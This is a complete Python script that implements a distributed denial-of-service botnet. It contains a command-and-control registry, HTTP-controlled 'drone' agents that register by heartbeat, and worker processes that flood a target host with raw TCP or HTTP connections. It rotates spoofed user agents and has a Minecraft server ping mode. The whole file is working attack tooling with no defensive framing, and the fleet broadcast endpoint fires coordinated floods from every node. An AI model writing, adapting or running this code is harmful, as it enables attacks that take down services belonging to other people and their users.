#!/usr/bin/env python3
"""flood.py - registry (C2) + agent (drone) + dripper (worker) in one file. Stdlib only.

  python3 flood.py                     # registry if $REGISTRY is set, else agent
  python3 flood.py registry            # force C2
  python3 flood.py agent               # force drone
  python3 flood.py drip -s HOST -p 80  # force worker (also: flood.py -s HOST -p 80)
"""
import argparse, json, os, random, socket, subprocess, sys, threading, time, urllib.parse, urllib.request
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "curl/8.4.0",
    "python-urllib/3.11",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

MODES = ("drip", "agent", "registry")
SELF = os.path.abspath(__file__)
COUNT = 0
LOCK = threading.Lock()


def drip(argv):
    """Raw TCP/HTTP connect flood. One process, N threads, disjoint port slice."""
    global COUNT
    ap = argparse.ArgumentParser(prog="flood.py drip")
    ap.add_argument("-s", "--server", required=True)
    ap.add_argument("-p", "--port", type=int, default=25565)
    ap.add_argument("-t", "--threads", type=int, default=32)
    ap.add_argument("-w", "--worker", type=int, default=1)
    ap.add_argument("-n", "--of", type=int, default=1)
    ap.add_argument("-d", "--delay", type=float, default=0.0)
    ap.add_argument("-q", "--quiet", action="store_true")
    ap.add_argument("--mc", action="store_true")
    a = ap.parse_args(argv)

    random.seed(a.worker * 7919 + a.of)
    host = socket.getaddrinfo(a.server, a.port, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
    lo = 1024 + (65535 - 1024) * (a.worker - 1) // a.of
    hi = 1024 + (65535 - 1024) * a.worker // a.of
    if a.mc:
        packet = b"\xfe\x01"
    else:
        packet = (b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n"
                  b"User-Agent: " + random.choice(UAS).encode() + b"\r\n\r\n")
    print(f"[w{a.worker}/{a.of}] {host}:{a.port} threads={a.threads} "
          f"ports={lo}-{hi} mode={'mc' if a.mc else 'http'}")

    def work():
        global COUNT
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    try:
                        s.bind(("", random.randint(lo, hi)))
                    except OSError:
                        pass
                    s.connect((host, a.port))
                    s.sendall(packet)
                    try:
                        s.recv(1024)
                        s.shutdown(socket.SHUT_WR)
                    except OSError:
                        pass
                finally:
                    s.close()
                with LOCK:
                    COUNT += 1
            except OSError:
                time.sleep(0.01)
            if a.delay:
                time.sleep(a.delay)

    for _ in range(a.threads):
        threading.Thread(target=work, daemon=True).start()

    start = time.time()
    last = 0
    try:
        while True:
            time.sleep(0.25)
            with LOCK:
                c = COUNT
            if not a.quiet and c - last >= 1000:
                el = time.time() - start
                print(f"{el:.0f}s {c / el:.0f} req/s total={c}")
                last = c
    except KeyboardInterrupt:
        el = time.time() - start
        with LOCK:
            c = COUNT
        print(f"\n{c} requests in {el:.1f}s ({c / el:.0f} req/s)")
        sys.exit(0)


def agent():
    """Drone controller. Spawns flood.py drip children on demand."""
    port = int(os.environ.get("PORT", "8000"))
    node = os.environ.get("NODE_ID") or os.environ.get("RENDER_SERVICE_NAME") or "0"
    procs = int(os.environ.get("PROCS", "2"))
    threads = int(os.environ.get("THREADS", "32"))
    token = os.environ.get("TOKEN", "")
    registry = os.environ.get("REGISTRY", "")
    start = time.time()
    kids = []
    target = {"host": None, "port": None}

    def kill_all():
        with LOCK:
            cur, kids[:] = list(kids), []
        for p in cur:
            try:
                p.kill()
                p.wait(timeout=3)
            except Exception:
                pass

    def attack(host, hport, nprocs, nthreads, mc):
        kill_all()
        for i in range(1, nprocs + 1):
            cmd = [sys.executable, SELF, "drip", "-s", host, "-p", str(hport),
                   "-w", str(i), "-n", str(nprocs), "-t", str(nthreads), "-q"]
            if mc:
                cmd.append("--mc")
            with LOCK:
                kids.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL))
        target["host"], target["port"] = host, hport

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a): pass

        def reply(self, obj, code=200):
            b = json.dumps(obj).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)

        def do_GET(self):
            u = urllib.parse.urlparse(self.path)
            q = {k: v[0] for k, v in urllib.parse.parse_qs(u.query).items()}
            if token and q.get("k") != token:
                return self.reply({"error": "unauthorized"}, 401)
            if u.path == "/":
                with LOCK:
                    run = any(p.poll() is None for p in kids)
                    n = len(kids)
                return self.reply({"node": node, "uptime_s": round(time.time() - start, 1),
                                   "running": run, "target": target["host"],
                                   "port": target["port"], "procs": n})
            if u.path == "/attack":
                attack(q.get("host", "127.0.0.1"), int(q.get("port", 25565)),
                       int(q.get("procs", procs)), int(q.get("threads", threads)),
                       q.get("mc") == "1")
                return self.reply({"ok": True})
            if u.path == "/stop":
                kill_all()
                return self.reply({"ok": True})
            return self.reply({"error": "not found"}, 404)

    def heartbeat():
        url = os.environ.get("RENDER_EXTERNAL_URL") or f"http://{node}:{port}"
        payload = json.dumps({"node": node, "url": url}).encode()
        while True:
            try:
                req = urllib.request.Request(registry.rstrip("/") + "/register"
                                             + (f"?k={token}" if token else ""),
                                             data=payload, method="POST",
                                             headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req, timeout=10).read()
            except Exception:
                pass
            time.sleep(30)

    if registry:
        threading.Thread(target=heartbeat, daemon=True).start()
    print(f"agent node={node} :{port} procs={procs} threads={threads} "
          f"token={'yes' if token else 'no'} registry={registry or '-'}")
    ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()


def registry():
    """Fleet registry. Fans commands out to every known node concurrently."""
    port = int(os.environ.get("PORT", "8000"))
    token = os.environ.get("TOKEN", "")
    nodes = {}

    def broadcast(path):
        with LOCK:
            urls = [n["url"] for n in nodes.values()]

        def one(u):
            try:
                urllib.request.urlopen(u.rstrip("/") + path, timeout=30).read()
                return 1
            except Exception:
                return 0

        with ThreadPoolExecutor(max_workers=len(urls) or 1) as ex:
            return sum(ex.map(one, urls))

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a): pass

        def reply(self, obj, code=200):
            b = json.dumps(obj).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)

        def route(self):
            u = urllib.parse.urlparse(self.path)
            q = {k: v[0] for k, v in urllib.parse.parse_qs(u.query).items()}
            if token and q.get("k") != token:
                return self.reply({"error": "unauthorized"}, 401)
            if u.path == "/":
                with LOCK:
                    return self.reply(list(nodes.values()))
            if u.path == "/fleet":
                return self.reply({"fired": broadcast("/attack?" + u.query)})
            if u.path == "/stop":
                return self.reply({"fired": broadcast("/stop?" + u.query)})
            if u.path == "/register" and self.command == "POST":
                n = int(self.headers.get("Content-Length", 0))
                d = json.loads(self.rfile.read(n) or b"{}")
                if d.get("node") and d.get("url"):
                    with LOCK:
                        nodes[d["node"]] = {"node": d["node"], "url": d["url"],
                                            "seen": time.time()}
                return self.reply({"ok": True})
            return self.reply({"error": "not found"}, 404)

        do_GET = do_POST = route

    print(f"registry :{port} token={'yes' if token else 'no'}")
    ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()


def main():
    argv = sys.argv[1:]
    if argv and argv[0] in MODES:
        mode, argv = argv[0], argv[1:]
    elif argv:
        mode = "drip"
    else:
        mode = "registry" if os.environ.get("REGISTRY") else "agent"
    if mode == "drip":
        drip(argv)
    elif mode == "registry":
        registry()
    else:
        agent()


if __name__ == "__main__":
    main()
